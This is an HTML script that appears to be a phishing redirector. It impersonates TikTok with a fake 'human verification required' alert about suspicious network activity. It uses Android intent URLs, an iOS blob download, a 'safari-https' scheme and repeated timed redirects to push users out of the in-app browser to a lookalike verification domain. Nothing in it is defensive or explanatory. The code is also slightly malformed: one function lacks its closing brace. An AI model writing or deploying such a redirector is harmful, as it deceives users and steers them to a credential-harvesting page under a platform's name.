<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
    const killTime = Date.now() + 5000;

    function goSickoMode() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // ANDROID SICKO: Intent recursion
            // We force a Chrome-specific package call that bypasses the "Picker"
            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS SICKO: The Binary Overflow
            // We create a "heavy" fake file that TikTok hates
            const heavyContent = "A".repeat(1000) + `<script>window.location.replace("${targetUrl}");<\/script>`;
            const blob = new Blob([heavyContent], {type: 'application/octet-stream'});
            const url = URL.createObjectURL(blob);
            
            // 1. Force a "System Save" prompt
            window.location.href = url;

            // 2. Immediately fire the Safari-Direct scheme to "thread" the gap
            setTimeout(() => {
                window.location.href = "safari-https://" + cleanUrl;
            }, 50);

            // 3. The "Ghost" Assignment
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 150);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) {
            document.body.innerHTML = "REDIRECTING...";
            window.location.href = targetUrl;
            return;
        }

        // Trigger the overflow
        goSickoMode();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                // Fire again on "OK"
                goSickoMode();
                setTimeout(securityLogic, 200);
            }
        }, 200);

    window.onload = securityLogic;
</script>
